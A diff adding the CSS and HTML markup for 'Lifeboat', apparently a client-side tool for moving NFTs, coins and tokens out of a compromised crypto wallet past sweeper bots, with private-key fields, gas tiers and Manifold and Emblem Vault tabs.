+/* ── NEW V10 FEATURES ─────────────────────────────────────────────── */
+
+/* Header wallet display */
+.wallet-display { display: flex; align-items: center; gap: 6px; font-size: 0.65rem; font-family: var(--mono); }
+.wallet-from { color: var(--danger); }
+.wallet-to { color: var(--safe); }
+.wallet-arrow { color: var(--text3); font-size: 0.7rem; }
+.seal-mini { width: 32px; height: 32px; object-fit: contain; }
+
+/* Header stats */
+.header-stats { display: flex; gap: 16px; align-items: center; }
+.hstat { text-align: center; }
+.hstat-val { font-family: var(--display); font-size: 1.1rem; letter-spacing: 0.05em; }
+.hstat-val.total { color: var(--accent3); }
+.hstat-val.rescue { color: var(--safe); }
+.hstat-val.skip { color: var(--text3); }
+.hstat-lbl { font-size: 0.55rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.1em; }
+
+/* Rescue setup row */
+.rescue-setup { padding: 16px 20px; background: var(--s1); border-bottom: 1px solid var(--border); }
+.setup-row { display: flex; gap: 10px; align-items: flex-end; flex-wrap: wrap; }
+.setup-field { display: flex; flex-direction: column; gap: 4px; }
+.setup-field.grow { flex: 1; min-width: 180px; }
+.setup-label { font-size: 0.6rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; }
+.setup-input { background: var(--s2); border: 1px solid var(--border); border-radius: var(--radius); padding: 8px 12px; font-size: 0.7rem; color: var(--text); font-family: var(--mono); outline: none; }
+.setup-input:focus { border-color: var(--accent); }
+.setup-input.from:focus { border-color: var(--danger); }
+.setup-input.to:focus { border-color: var(--safe); }
+.badge-sm { font-size: 0.5rem; padding: 1px 5px; border-radius: 3px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.08em; }
+.badge-from { background: rgba(255,60,60,0.15); color: var(--danger); }
+.badge-to { background: rgba(0,232,122,0.15); color: var(--safe); }
+
+/* Toolbar */
+.toolbar { display: flex; align-items: center; gap: 12px; padding: 10px 20px; background: var(--s2); border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+.filter-tabs { display: flex; gap: 4px; }
+.ftab { background: var(--s3); border: 1px solid var(--border); border-radius: var(--radius); padding: 5px 12px; font-size: 0.6rem; color: var(--text2); cursor: pointer; transition: all 0.15s; }
+.ftab:hover { border-color: var(--border2); color: var(--text); }
+.ftab.active { background: var(--accent); color: var(--bg); border-color: var(--accent); font-weight: 600; }
+.ftab.rescue-tab.active { background: var(--safe); border-color: var(--safe); }
+.ftab.skip-tab.active { background: var(--text3); border-color: var(--text3); }
+.ftab.flag-tab.active { background: var(--warn); border-color: var(--warn); }
+.view-toggle { display: flex; gap: 2px; }
+.vtab { background: var(--s3); border: 1px solid var(--border); padding: 5px 10px; font-size: 0.7rem; color: var(--text2); cursor: pointer; }
+.vtab:first-child { border-radius: var(--radius) 0 0 var(--radius); }
+.vtab:last-child { border-radius: 0 var(--radius) var(--radius) 0; }
+.vtab.active { background: var(--s4); color: var(--text); border-color: var(--border2); }
+
+/* Search */
+.search-box { display: flex; align-items: center; background: var(--s3); border: 1px solid var(--border); border-radius: var(--radius); padding: 0 10px; flex: 1; min-width: 120px; max-width: 220px; }
+.search-icon { color: var(--text3); font-size: 0.8rem; margin-right: 6px; }
+.search-input { background: none; border: none; color: var(--text); font-size: 0.65rem; padding: 6px 0; outline: none; width: 100%; font-family: var(--mono); }
+.toolbar-actions { display: flex; gap: 6px; margin-left: auto; }
+
+/* Content area */
+.content { flex: 1; overflow-y: auto; padding: 16px 20px; }
+
+/* Export row */
+.export-row { display: flex; gap: 8px; padding: 12px 20px; border-top: 1px solid var(--border); background: var(--s1); align-items: center; justify-content: center; }
+.export-btn { background: var(--s3); border: 1px solid var(--border); border-radius: var(--radius); padding: 8px 16px; font-size: 0.65rem; color: var(--text); cursor: pointer; font-family: var(--mono); }
+.export-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+/* Gas tiers */
+.gas-tiers { display: flex; gap: 8px; }
+.gas-tier { flex: 1; background: var(--s2); border: 1px solid var(--border); border-radius: var(--radius); padding: 12px; cursor: pointer; text-align: center; transition: all 0.15s; }
+.gas-tier:hover { border-color: var(--border2); }
+.gas-tier.active { border-color: var(--accent); background: rgba(240,208,32,0.05); }
+.gas-tier-name { font-size: 0.7rem; color: var(--text); font-weight: 500; margin-bottom: 4px; }
+.gas-tier-mult { font-size: 0.6rem; color: var(--text3); }
+
+/* Logo in header */
+.logo-img { height: 20px; }
+
+/* Lifeboat content area */
+.lb-content { padding: 20px; overflow-y: auto; flex: 1; }
+
+/* Footer */
+.footer { padding: 16px 24px; border-top: 1px solid var(--border); background: var(--s1); display: flex; flex-direction: column; gap: 8px; align-items: center; text-align: center; }
+.footer-main { display: flex; align-items: center; gap: 8px; font-size: 0.68rem; color: var(--text2); flex-wrap: wrap; justify-content: center; }
+.footer-coffee { display: inline-flex; align-items: center; gap: 6px; background: var(--accent); color: var(--bg); font-weight: 600; padding: 6px 14px; border-radius: var(--radius); text-decoration: none; font-size: 0.65rem; }
+.footer-coffee:hover { background: #d4b81c; }
+.footer-sub { font-size: 0.55rem; color: var(--text3); }
+.footer-links { display: flex; gap: 16px; font-size: 0.6rem; }
+.footer-links a { color: var(--text2); text-decoration: none; text-transform: uppercase; letter-spacing: 0.1em; }
+.footer-links a:hover { color: var(--accent2); }
+
+/* NFT card action bar */
+.nft-actions {
+  display: flex; gap: 0; border-top: 1px solid var(--border);
+}
+.nft-act {
+  flex: 1; padding: 5px 8px; font-size: 0.5rem; text-align: center;
+  color: var(--text3); background: var(--s2); border: none; cursor: pointer;
+  text-decoration: none; font-family: var(--mono); transition: all 0.15s;
+}
+.nft-act:hover { color: var(--text); background: var(--s3); }
+.nft-act.flagged { color: var(--warn); background: rgba(255,149,0,0.08); }
+.nft-act + .nft-act { border-left: 1px solid var(--border); }
+
+/* Check badge (selected overlay) */
+.check-badge {
+  position: absolute; top: 6px; left: 6px;
+  width: 20px; height: 20px; border-radius: 2px;
+  background: var(--s2); border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.6rem; color: transparent; transition: all 0.12s;
+}
+.nft-card.selected .check-badge {
+  background: var(--safe); border-color: var(--safe); color: var(--bg);
+}
+
+/* Quantity badge (ERC-1155) */
+.qty-badge {
+  position: absolute; top: 6px; right: 6px;
+  background: rgba(0,0,0,0.75); color: var(--accent);
+  font-size: 0.55rem; font-weight: 600; padding: 2px 6px;
+  border-radius: 2px; font-family: var(--mono);
+}
+
+/* Token ID under name */
+.nft-id {
+  font-size: 0.5rem; color: var(--text3); font-family: var(--mono);
+}
+
+/* Override splash seal for splash screen - big centered */
+.splash-landing .splash-seal { width: 280px; height: 280px; }
+
+/* Balance/Token dashboard rows */
+.dash-row {
+  display: flex; align-items: center; gap: 12px;
+  padding: 12px 14px; border: 1px solid var(--border);
+  background: var(--s1); margin-bottom: 4px; border-radius: var(--radius);
+  transition: all 0.15s;
+}
+.dash-row:hover { border-color: var(--border2); }
+.dash-chain-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.dash-chain-name { font-size: 0.7rem; color: var(--text); font-weight: 500; min-width: 90px; }
+.dash-balance { font-size: 0.75rem; color: var(--text); font-family: var(--mono); flex: 1; }
+.dash-balance.zero { color: var(--text3); }
+.dash-symbol { font-size: 0.6rem; color: var(--text3); min-width: 40px; }
+.dash-mev { font-size: 0.5rem; color: var(--safe); }
+.dash-sweep-btn {
+  background: rgba(0,200,160,0.08); border: 1px solid rgba(0,200,160,0.35);
+  color: var(--accent2); font-family: var(--mono); font-size: 0.6rem;
+  padding: 6px 14px; border-radius: var(--radius); cursor: pointer;
+  transition: all 0.15s; white-space: nowrap;
+}
+.dash-sweep-btn:hover { background: rgba(0,200,160,0.18); border-color: rgba(0,200,160,0.65); }
+.dash-sweep-btn:disabled { opacity: 0.3; cursor: not-allowed; }
+.dash-sweep-btn.done { background: rgba(0,232,122,0.1); border-color: var(--safe); color: var(--safe); }
+/* ── RESCUE VIDEO ── */
+.rescue-video-wrap {
+  display: none;
+  width: 100%;
+  background: rgba(6,12,20,0.95);
+  border-top: 1px solid var(--border2);
+  margin-top: 16px;
+}
+.rescue-video-wrap.visible { display: block; }
+.rescue-video-inner {
+  position: relative;
+  max-width: 100%;
+}
+.rescue-video-inner video {
+  width: 100%;
+  height: auto;
+  display: block;
+  opacity: 0.88;
+}
+.rescue-video-mute {
+  position: absolute;
+  top: 10px; right: 14px;
+  background: rgba(6,12,20,0.75);
+  border: 1px solid var(--border2);
+  color: var(--text3);
+  font-size: 0.6rem;
+  font-family: var(--mono);
+  padding: 4px 10px;
+  cursor: pointer;
+  letter-spacing: 0.08em;
+  transition: color 0.15s;
+}
+.rescue-video-mute:hover { color: var(--text); }
+
+</style>
+</head>
+<body class="tab-rescue">
+
+<div class="bg-scene bg-scene-rescue"></div>
+<div class="bg-scene bg-scene-lifeboat"></div>
+
+<!-- SPLASH -->
+<div class="splash" id="splash">
+  <div class="splash-bg" id="splashBg"></div>
+  <div class="splash-vignette" id="splashVignette"></div>
+  <div class="splash-landing" id="splashLanding">
+    <img class="splash-seal" src="https://rufdvqdawrhrqqczy7npzsvyxejlxz3fnsyjodhhftfds2hjjasa.ar.io/jQo6wGC0TxhAWcfa_Mq4uRK752VssJcM5yzKOWjpSCQ/boat.png" alt="LIFEBOAT" />
+    <button class="splash-first-btn" onclick="showSplashMessage()">⚓ First Things First</button>
+  </div>
+  <div class="splash-msg-wrap" id="splashMsgWrap">
+    <div class="splash-msg-inner">
+      <div class="splash-message">
+        <div class="splash-graf">First things first... if you're here, you're probably not feeling great right now. That's okay. There will be plenty of time later to go over all the ways things could have gone differently. But <strong>right now, we have to stop the bleeding and secure your assets.</strong></div>
+        <div class="splash-graf">Before we get started: <em>have you scanned your computer?</em> There's no point in taking a nice hot shower and putting the same dirty clothes back on. Before we do anything, let's make sure your machine isn't still compromised.</div>
+        <div class="splash-av">
+          <span class="splash-av-icon">⚠</span>
+          <span><strong style="color:var(--text);">Run a malware scan before you proceed.</strong> If your seed phrase was exposed through a malicious extension or keylogger, moving your NFTs to a new wallet on the same machine might just be moving them to a wallet the attacker can also access. Recommended: <a href="https://www.malwarebytes.com" target="_blank">Malwarebytes</a> (free), or ideally, use a completely separate device.</span>
+        </div>
+        <div class="splash-graf">Here's the good news. Your run-of-the-mill scammer is <strong>lazy.</strong> They hope you panic and don't think clearly, and send more crypto to your wallet. Nine times out of ten you're up against a bot, not a person sitting there watching you. That bot is monitoring the mempool like a purse snatcher waiting outside Macy's... the second it sees ETH hit your wallet, it grabs it.</div>
+        <div class="splash-graf"><span class="green"><strong>But we go in through the garage.</strong></span> We use private transaction routing that keeps your transactions completely hidden from the mempool until they land in a block. The bot never sees you coming. We move tactical, extract your possessions, and by the time anything registers on their end... <strong>you're already long gone, and there's nothing left but dust.</strong></div>
+        <div class="splash-graf">So. Let's put our game faces on. <span class="yellow"><strong>We're going to talk you through this, step by step.</strong></span></div>
+      </div>
+      <div class="splash-cta">
+        <button class="splash-enter" onclick="enterTool()">ENTER THE OPERATIONS CENTER</button>
+        <div class="splash-note">Your private keys NEVER leave your device · All operations run locally · Every line of code is readable</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app" id="appRoot" style="opacity:0;transition:opacity 0.7s;">
+  <header class="header">
+    <div class="logo"><img class="logo-img" src="https://ig2nt5bc2vhzda6zz5qqikv6wbw6cnjfmbvy3yigchahpki2irha.ar.io/QbTZ9CLVT5GD2c9hBCq-sG3hNSVga43hBhHAd6kaRE4/boat.png" alt="LIFEBOAT" /></div>
+    <div class="wallet-display" id="walletDisplay">
+      <span class="wallet-from" id="hdrFrom">—</span>
+      <span class="wallet-arrow">→</span>
+      <span class="wallet-to" id="hdrTo">—</span>
+    </div>
+    <div class="header-stats" id="headerStats" style="display:none;">
+      <div class="hstat"><div class="hstat-val total" id="statTotal">0</div><div class="hstat-lbl">Found</div></div>
+      <div class="hstat"><div class="hstat-val rescue" id="statRescue">0</div><div class="hstat-lbl">Rescue</div></div>
+      <div class="hstat"><div class="hstat-val skip" id="statSkip">0</div><div class="hstat-lbl">Skip</div></div>
+    </div>
+    <nav class="nav-bar">
+      <button class="nav-btn nav-rescue active" id="nav-rescue" onclick="showPage('rescue',this)">⬡ Rescue</button>
+      <button class="nav-btn nav-lifeboat" id="nav-lifeboat" onclick="showPage('lifeboat',this)">▶ Lifeboat</button>
+      <button class="nav-btn nav-faq" id="nav-faq" onclick="showPage('faq',this)">FAQ</button>
+    </nav>
+    <div class="header-right">
+      <button class="btn-fire" onclick="confirmBurn()">🔥 Clear</button>
+      <img class="seal-mini" src="https://rufdvqdawrhrqqczy7npzsvyxejlxz3fnsyjodhhftfds2hjjasa.ar.io/jQo6wGC0TxhAWcfa_Mq4uRK752VssJcM5yzKOWjpSCQ/boat.png" alt="" />
+    </div>
+  </header>
+
+  <!-- RESCUE PAGE -->
+  <div id="page-rescue" class="page active">
+    <div class="rescue-setup">
+      <div class="setup-row">
+        <div class="setup-field grow">
+          <div class="setup-label">Compromised Wallet <span class="badge-sm badge-from">FROM</span></div>
+          <input type="text" class="setup-input from" id="fromWallet" placeholder="0x... or ENS name" oninput="onWalletInput()" />
+        </div>
+        <div class="setup-field grow">
+          <div class="setup-label">Clean Wallet <span class="badge-sm badge-to">TO</span></div>
+          <input type="text" class="setup-input to" id="toWallet" placeholder="0x... your safe destination" oninput="onWalletInput()" />
+        </div>
+        <div class="setup-field" style="min-width:180px;">
+          <div class="setup-label">Alchemy API Key <a href="https://dashboard.alchemy.com" target="_blank" style="color:var(--accent2);font-size:0.65rem;margin-left:6px;">Get free key →</a></div>
+          <input type="text" class="setup-input" id="alchemyKey" placeholder="Paste key here" oninput="onWalletInput()" />
+        </div>
+        <button class="btn btn-primary" id="scanBtn" onclick="startScan()" disabled>⬡ Scan All Chains</button>
+        <button class="btn btn-ghost" onclick="importJSON()">↑ Import</button>
+      </div>
+    </div>
+    <div class="toolbar" id="toolbar" style="display:none;">
+      <div class="filter-tabs">
+        <button class="ftab active" onclick="setFilter('all',this)">All</button>
+        <button class="ftab rescue-tab" onclick="setFilter('rescue',this)">Rescue</button>
+        <button class="ftab skip-tab" onclick="setFilter('skip',this)">Skipping</button>
+        <button class="ftab flag-tab" onclick="setFilter('flagged',this)">⚠ Flagged</button>
+      </div>
+      <div class="view-toggle">
+        <button class="vtab active" onclick="setView('list',this)">☰</button>
+        <button class="vtab" onclick="setView('gallery',this)">⊞</button>
+      </div>
+      <div class="search-box">
+        <span class="search-icon">⌕</span>
+        <input type="text" class="search-input" id="searchInput" placeholder="Search..." oninput="doSearch()" />
+      </div>
+      <div class="toolbar-actions">
+        <button class="btn btn-ghost" onclick="selectAll()">Select All</button>
+        <button class="btn btn-ghost" onclick="deselectAll()">Deselect All</button>
+      </div>
+    </div>
+    <div class="content" id="content">
+      <div class="empty-state">
+        <div class="empty-icon">⬡</div>
+        <div class="empty-title">No wallet scanned yet</div>
+        <div class="empty-sub">Enter your compromised wallet address above and scan all chains.<br>Need an Alchemy key? <a href="https://dashboard.alchemy.com" target="_blank">Get one free →</a></div>
+      </div>
+    </div>
+    <div class="export-row" id="exportRow" style="display:none;">
+      <button class="export-btn" onclick="exportJSON()">↓ Export Rescue List</button>
+      <button class="btn btn-green" onclick="sendToLifeboat()">▶ Launch Lifeboat</button>
+      <button class="btn btn-ghost" onclick="exportCSV()">↓ CSV</button>
+    </div>
+    <footer class="footer">
+      <div class="footer-main">
+        <span>Created by <strong>Kane Mayfield</strong></span>
+        <span>—</span>
+        <span>Buy him a</span>
+        <a class="footer-coffee" href="#" onclick="event.preventDefault();openKaneModal()">☕ COFFEE</a>
+        <span>or buy his art and he'll spend that money on stuff even better than coffee.</span>
+      </div>
+      <div class="footer-sub">Free to use · Share it with anyone who needs it</div>
+      <div class="footer-links">
+        <a href="https://kanemayfield.com" target="_blank">KaneMayfield.com</a>
+        <a href="https://twitter.com/kanemayfield" target="_blank">@KaneMayfield</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- LIFEBOAT PAGE -->
+  <div id="page-lifeboat" class="page">
+    <div class="lb-tabs">
+      <button class="lb-tab active" onclick="showLbTab('nft',this)">NFT Rescue</button>
+      <button class="lb-tab" onclick="showLbTab('eth',this)">Native Sweep</button>
+      <button class="lb-tab" onclick="showLbTab('tokens',this)">Coin Sweep</button>
+      <button class="lb-tab" onclick="showLbTab('manifold',this)">Manifold</button>
+      <button class="lb-tab" onclick="showLbTab('emblem',this)">Emblem Vault</button>
+    </div>
+    <div class="lb-content">
+      <!-- NFT TAB -->
+      <div class="lb-tab-content active" id="tab-nft">
+        <div class="info-box info" id="noDataMsg"><span>◈</span><span>No rescue data loaded. Go to RESCUE tab to scan, or import JSON.</span></div>
+        <div id="rescueDataLoaded" style="display:none;">
+          <div class="tool-card">
+            <div class="tool-card-header"><span class="tool-card-icon">🔑</span><span class="tool-card-title">Private Keys — Never stored, never transmitted</span></div>
+            <div class="tool-card-body">
+              <div class="field-group">
+                <div class="field-label">Compromised Wallet <span style="color:var(--danger);">KEY</span> <span class="badge-sm badge-from">FROM</span></div>
+                <input type="password" class="field-input" id="compromisedKey" placeholder="0x... private key" oninput="onKeyInput()" />
+              </div>
+              <div class="field-group">
+                <div class="field-label">Funding Wallet <span style="color:var(--danger);">KEY</span> <span class="badge-sm badge-to">GAS</span></div>
+                <input type="password" class="field-input" id="fundingKey" placeholder="0x... private key" oninput="onKeyInput()" />
+              </div>
+              <button class="btn btn-ghost" id="balanceBtn" onclick="checkBalances()" disabled style="width:100%;">Check Balances</button>
+            </div>
+          </div>
+          <div class="balance-card" id="balanceCard" style="display:none;">
+            <div class="balance-item"><div class="balance-label from">COMPROMISED</div><div class="balance-value" id="balFrom">—</div><div class="balance-addr" id="addrFrom">—</div></div>
+            <div class="balance-item"><div class="balance-label to">DESTINATION</div><div class="balance-value" id="balFund">—</div><div class="balance-addr" id="addrFund">—</div></div>
+          </div>
+          <div class="tool-card">
+            <div class="tool-card-header"><span class="tool-card-icon">⬡</span><span class="tool-card-title">Chain Selection</span></div>
+            <div class="tool-card-body"><div id="execChainPills" style="display:flex;gap:8px;flex-wrap:wrap;"></div></div>
+          </div>
+          <div class="tool-card">
+            <div class="tool-card-header"><span class="tool-card-icon">⛽</span><span class="tool-card-title">Gas Settings</span></div>
+            <div class="tool-card-body">
+              <div class="gas-tiers">
+                <div class="gas-tier active" onclick="setGasTier('recommended',this)"><div class="gas-tier-name">Recommended</div><div class="gas-tier-mult">1.1× buffer</div></div>
+                <div class="gas-tier" onclick="setGasTier('safe',this)"><div class="gas-tier-name">Safe</div><div class="gas-tier-mult">1.25× buffer</div></div>
+                <div class="gas-tier" onclick="setGasTier('maximum',this)"><div class="gas-tier-name">Maximum</div><div class="gas-tier-mult">1.5× buffer</div></div>
+              </div>
+            </div>
+          </div>
+          <div class="gas-card" id="gasCard" style="display:none;">
+            <div class="gas-row"><span class="gas-label">Tokens to rescue</span><span class="gas-value" id="gasTokens">—</span></div>
+            <div class="gas-row"><span class="gas-label">Gas price</span><span class="gas-value" id="gasPrice">—</span></div>
+            <div class="gas-row"><span class="gas-label">Estimated cost</span><span class="gas-value highlight" id="gasCost">—</span></div>
+            <div class="gas-row"><span class="gas-label">MEV Protection</span><span class="gas-value" id="gasMev">—</span></div>
+          </div>
+          <button class="btn btn-green" id="executeBtn" onclick="confirmExecute()" disabled style="width:100%;padding:14px;">▶ Execute Rescue</button>
+          <div class="progress-wrap" id="progressWrap" style="display:none;">
+            <div class="progress-steps">
+              <div class="progress-step" id="step1"><div class="progress-num">1</div><div class="progress-label">Fund</div></div>
+              <div class="progress-step" id="step2"><div class="progress-num">2</div><div class="progress-label">Transfer</div></div>
+              <div class="progress-step" id="step3"><div class="progress-num">3</div><div class="progress-label">Confirm</div></div>
+            </div>
+            <div class="progress-bar-wrap"><div class="progress-bar" id="progressBar"></div></div>
+          </div>
+          <div class="exec-log" id="execLog" style="display:none;"></div>
+          <div class="rescue-video-wrap" id="rescueVideoWrap">
+            <div class="rescue-video-inner">
+              <video id="rescueVideo" src="https://2ibbkowxedrofpyarvjkopsiaxklbiiqpncbyn7eg5vlj3imhsdq.ar.io/0gIVOtcg4uK_AI1Spz5IBdSwoRB7RBw35DdqtO0MPIc/lifeboatvid.mp4"
+                loop muted playsinline preload="none"></video>
+              <button class="rescue-video-mute" id="rescueVideoMuteBtn" onclick="toggleVideoMute()">🔇 SOUND OFF</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- TOKEN TAB -->
+      <div class="lb-tab-content" id="tab-tokens">
+        <div class="info-box info"><span>◈</span><span>Scan for ERC-20 tokens (USDC, WETH, airdrops, etc.) and sweep them to your clean wallet.</span></div>
+        <div class="tool-card">
+          <div class="tool-card-header"><span class="tool-card-icon">🪙</span><span class="tool-card-title">Token Scanner</span></div>
+          <div class="tool-card-body">
+            <div class="field-group">
+              <div class="field-label">Compromised Wallet <span style="color:var(--danger);">KEY</span></div>
+              <input type="password" class="field-input" id="tokenKey" placeholder="0x... private key" oninput="checkTokenSweepReady()" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Destination <span style="color:var(--safe);">Address</span></div>
+              <input type="text" class="field-input" id="tokenDest" placeholder="0x... clean wallet" oninput="checkTokenSweepReady()" />
+            </div>
+            <button class="btn btn-primary" id="scanTokensBtn" onclick="scanTokens()" disabled style="width:100%;">🪙 Scan All Chains for Tokens</button>
+            <div id="tokenDashboard" style="display:none;margin-top:12px;">
+              <div id="tokenRows"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- ETH TAB - Native Balance Dashboard -->
+      <div class="lb-tab-content" id="tab-eth">
+        <div class="info-box warn"><span>◈</span><span>View native token balances across all chains and sweep to safety. MEV Blocker protects Ethereum sweeps.</span></div>
+        <div class="tool-card">
+          <div class="tool-card-header"><span class="tool-card-icon">⬡</span><span class="tool-card-title">Native Balances</span></div>
+          <div class="tool-card-body">
+            <div class="field-group">
+              <div class="field-label">Compromised Wallet <span style="color:var(--danger);">KEY</span> or <span style="color:var(--accent2);">Address</span></div>
+              <input type="text" class="field-input" id="sweepKey" placeholder="0x... private key or public address" oninput="checkSweepKeyReady()" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Destination <span style="color:var(--safe);">Address</span></div>
+              <input type="text" class="field-input" id="sweepDest" placeholder="0x... clean wallet" oninput="checkSweepKeyReady()" />
+            </div>
+            <button class="btn btn-primary" id="scanBalancesBtn" onclick="scanAllBalances()" disabled style="width:100%;">⬡ Scan All Balances</button>
+            <div id="balanceDashboard" style="display:none;margin-top:12px;">
+              <div id="balanceRows"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- MANIFOLD TAB -->
+      <div class="lb-tab-content" id="tab-manifold">
+        <div class="info-box info"><span>◈</span><span>Transfer Manifold contract ownership via MEV Blocker.</span></div>
+        <div class="tool-card">
+          <div class="tool-card-header"><span class="tool-card-icon">◎</span><span class="tool-card-title">Transfer Contract Ownership</span></div>
+          <div class="tool-card-body">
+            <div class="field-group">
+              <div class="field-label">Manifold Contract Address</div>
+              <input type="text" class="field-input" id="manifoldContract" placeholder="0x..." oninput="checkManifoldReady()" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Compromised Wallet <span style="color:var(--danger);">KEY</span> <span class="badge-sm badge-from">FROM</span></div>
+              <input type="password" class="field-input" id="manifoldFromKey" placeholder="0x... current owner key" oninput="checkManifoldReady()" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">New Owner <span style="color:var(--safe);">Address</span> <span class="badge-sm badge-to">TO</span></div>
+              <input type="text" class="field-input" id="manifoldNewOwner" placeholder="0x... clean wallet" oninput="checkManifoldReady()" />
+            </div>
+            <button class="btn btn-green" id="manifoldBtn" onclick="confirmManifold()" disabled style="width:100%;">▶ Transfer Ownership</button>
+            <div id="manifoldStatus" style="font-size:0.6rem;color:var(--text3);margin-top:8px;"></div>
+          </div>
+        </div>
+      </div>
+      <!-- EMBLEM VAULT TAB -->
+      <div class="lb-tab-content" id="tab-emblem">
+        <div class="info-box info"><span>◈</span><span>Rescue Emblem Vault NFTs (V2 + Legacy) via MEV Blocker. Scan, inspect vault contents, and generate ownership proofs.</span></div>
+
+        <!-- ── SCAN & RESCUE ── -->
+        <div class="tool-card">
+          <div class="tool-card-header"><span class="tool-card-icon">🔒</span><span class="tool-card-title">Scan for Emblem Vaults</span></div>
+          <div class="tool-card-body">
+            <div class="field-group">
+              <div class="field-label">Compromised Wallet <span style="color:var(--danger);">Address</span> <span class="badge-sm badge-from">FROM</span></div>
+              <input type="text" class="field-input" id="emblemWallet" placeholder="0x... wallet to scan" oninput="checkEmblemScanReady()" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Alchemy API Key</div>
+              <input type="text" class="field-input" id="emblemAlchemyKey" placeholder="Alchemy key (auto-fills from Rescue tab)" />
+            </div>
+            <button class="btn btn-primary" id="emblemScanBtn" onclick="emblemScan()" disabled style="width:100%;">🔒 Scan for Emblem Vaults</button>
+          </div>
+        </div>
+
+        <div id="emblemResults" style="display:none;">
+          <div class="tool-card">
+            <div class="tool-card-header"><span class="tool-card-icon">📦</span><span class="tool-card-title">Found Vaults</span></div>
+            <div class="tool-card-body" id="emblemVaultRows"></div>
+          </div>
+
+          <!-- Keys & Execution -->
+          <div class="tool-card">
+            <div class="tool-card-header"><span class="tool-card-icon">🔑</span><span class="tool-card-title">Private Keys — Never stored, never transmitted</span></div>
+            <div class="tool-card-body">
+              <div class="field-group">
+                <div class="field-label">Compromised Wallet <span style="color:var(--danger);">KEY</span> <span class="badge-sm badge-from">FROM</span></div>
+                <input type="password" class="field-input" id="emblemCompromisedKey" placeholder="0x... private key" oninput="checkEmblemExecReady()" />
+              </div>
+              <div class="field-group">
+                <div class="field-label">Funding Wallet <span style="color:var(--danger);">KEY</span> <span class="badge-sm badge-to">GAS</span></div>
+                <input type="password" class="field-input" id="emblemFundingKey" placeholder="0x... private key" oninput="checkEmblemExecReady()" />
+              </div>
+              <div class="field-group">
+                <div class="field-label">Destination <span style="color:var(--safe);">Address</span> <span class="badge-sm badge-to">TO</span></div>
+                <input type="text" class="field-input" id="emblemDest" placeholder="0x... clean wallet" oninput="checkEmblemExecReady()" />
+              </div>
+            </div>
+          </div>
+
+          <div class="gas-card" id="emblemGasCard" style="display:none;">
+            <div class="gas-row"><span class="gas-label">Vaults to rescue</span><span class="gas-value" id="emblemGasTokens">—</span></div>
+            <div class="gas-row"><span class="gas-label">Gas price</span><span class="gas-value" id="emblemGasPrice">—</span></div>
+            <div class="gas-row"><span class="gas-label">Estimated cost</span><span class="gas-value highlight" id="emblemGasCost">—</span></div>
+            <div class="gas-row"><span class="gas-label">MEV Protection</span><span class="gas-value" id="emblemGasMev">—</span></div>
+          </div>
+
+          <button class="btn btn-green" id="emblemExecBtn" onclick="confirmEmblemRescue()" disabled style="width:100%;padding:14px;">▶ Execute Emblem Rescue</button>
+          <div class="exec-log" id="emblemExecLog" style="display:none;"></div>
+        </div>
+
+        <!-- ── VAULT INSPECTOR ── -->
+        <div class="tool-card" style="margin-top:16px;">
+          <div class="tool-card-header"><span class="tool-card-icon">🔍</span><span class="tool-card-title">Vault Inspector</span></div>
+          <div class="tool-card-body">
+            <div class="field-group">
+              <div class="field-label">Contract</div>
+              <div style="display:flex;gap:6px;">
+                <button class="btn btn-ghost emblem-contract-btn active" id="inspectV2Btn" onclick="setInspectContract('v2')" style="flex:1;">V2</button>
+                <button class="btn btn-ghost emblem-contract-btn" id="inspectLegacyBtn" onclick="setInspectContract('legacy')" style="flex:1;">Legacy</button>
+              </div>
+              <input type="hidden" id="emblemInspectContract" value="0x82C7a8f707110f5FBb16184A5933E9F78a34c6ab" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Token ID</div>
+              <input type="text" class="field-input" id="emblemInspectTokenId" placeholder="e.g. 12345" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Alchemy API Key</div>
+              <input type="text" class="field-input" id="emblemInspectAlchemyKey" placeholder="Uses same key if set above" />
+            </div>
+            <button class="btn btn-primary" onclick="inspectVault()" style="width:100%;">🔍 Inspect Vault</button>
+            <div id="emblemInspectResult" style="display:none;margin-top:12px;"></div>
+          </div>
+        </div>
+
+        <!-- ── OWNERSHIP PROOF ── -->
+        <div class="tool-card" style="margin-top:16px;">
+          <div class="tool-card-header"><span class="tool-card-icon">✍</span><span class="tool-card-title">Ownership Proof — Gas-free, invisible to bot</span></div>
+          <div class="tool-card-body">
+            <div class="info-box info" style="margin-bottom:12px;"><span>◈</span><span>Generates a cryptographic signature proving you own a vault. Costs zero gas — the sweeper bot cannot see this. Use it to prove ownership to Emblem support for profile migration.</span></div>
+            <div class="field-group">
+              <div class="field-label">Contract</div>
+              <div style="display:flex;gap:6px;">
+                <button class="btn btn-ghost emblem-contract-btn active" id="proofV2Btn" onclick="setProofContract('v2')" style="flex:1;">V2</button>
+                <button class="btn btn-ghost emblem-contract-btn" id="proofLegacyBtn" onclick="setProofContract('legacy')" style="flex:1;">Legacy</button>
+              </div>
+              <input type="hidden" id="emblemProofContract" value="0x82C7a8f707110f5FBb16184A5933E9F78a34c6ab" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Token ID</div>
+              <input type="text" class="field-input" id="emblemProofTokenId" placeholder="e.g. 12345" />
+            </div>
+            <div class="field-group">
+              <div class="field-label">Private Key <span style="color:var(--danger);">(compromised wallet)</span></div>
+              <input type="password" class="field-input" id="emblemProofKey" placeholder="0x... private key — used to sign, never transmitted" />
+            </div>
+            <button class="btn btn-primary" onclick="generateEmblemProof()" style="width:100%;">✍ Generate Proof</button>
+            <div id="emblemProofResult" style="display:none;margin-top:12px;"></div>
+          </div>
